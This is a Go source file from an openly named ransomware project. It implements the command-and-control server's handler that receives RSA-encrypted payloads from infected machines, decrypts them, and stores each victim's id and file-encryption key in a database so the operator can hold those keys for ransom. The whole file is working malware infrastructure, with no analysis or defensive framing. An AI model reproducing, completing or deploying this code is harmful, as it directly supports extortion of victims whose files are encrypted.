package main

import (
	"encoding/hex"
	"encoding/json"
	"net/http"

	"github.com/julienschmidt/httprouter"
	"github.com/mauri870/ransomware/repository"
	"github.com/mauri870/ransomware/rsa"
)

func validateAndPersistKeys(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	w.Header().Set("Content-Type", "application/json")

	r.ParseForm()

	// Check if payload parameter exists
	if _, ok := r.Form["payload"]; !ok {
		http.Error(w, ApiResponseNoPayload, http.StatusUnprocessableEntity)
		return
	}

	// Decode the hex string to []byte
	payload, err := hex.DecodeString(r.FormValue("payload"))
	if err != nil {
		http.Error(w, ApiResponseBadRequest, http.StatusBadRequest)
		return
	}

	// Decrypt the payload
	jsonPayload, err := rsa.Decrypt(PRIV_KEY, payload)
	if err != nil {
		http.Error(w, ApiResponseBadRSAEncryption, http.StatusUnprocessableEntity)
		return
	}

	// Parse the json keys
	keys, err := parseJsonKeys(jsonPayload)
	if err != nil {
		// Bad Json
		http.Error(w, ApiResponseBadJson, http.StatusBadRequest)
		return
	}

	// If nothing goes wrong, persist the keys...
	db := repository.Open("./database.db")
	defer db.Close()

	if !db.IsAvailable(keys["id"]) {
		// Id already exists
		http.Error(w, ApiResponseDuplicatedId, http.StatusConflict)
		return
	}

	db.CreateOrUpdate(keys["id"], keys["enckey"])

	// Success \o/
	w.WriteHeader(http.StatusNoContent)
}

// Parse the json keys
func parseJsonKeys(body []byte) (map[string]string, error) {
	var keys map[string]string
	if err := json.Unmarshal(body, &keys); err != nil {
		return keys, err
	}

	return keys, nil
}
